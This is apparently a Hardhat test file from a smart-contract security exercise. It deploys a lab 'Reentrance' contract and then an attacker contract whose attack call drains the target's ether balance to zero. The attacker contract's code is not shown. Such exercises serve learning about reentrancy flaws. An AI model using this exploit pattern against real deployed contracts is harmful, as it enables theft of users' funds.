import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract, utils } from 'ethers';
import { ethers } from 'hardhat';

const { provider } = ethers;

describe('Reentrance', () => {
  let owner: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, user1, user2, attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('Reentrance');
    contract = await Factory.deploy();
    await contract.deployed();

    let tx = await contract.connect(user1).donate(user2.address, { value: utils.parseEther('1') });
    await tx.wait();

    tx = await contract.connect(user2).donate(user1.address, { value: utils.parseEther('1.2') });
    await tx.wait();
  });

  it('attack', async () => {
    const AttackerFactory = await ethers.getContractFactory('ReentranceAttacker');
    const attackerContract = await AttackerFactory.connect(attacker).deploy(contract.address);
    await attackerContract.deployed();

    const tx = await attackerContract.connect(attacker).attack({
      value: utils.parseEther('1'),
    });
    await tx.wait();

    const balance = await provider.getBalance(contract.address);
    expect(balance).to.equal(0);
  });
});
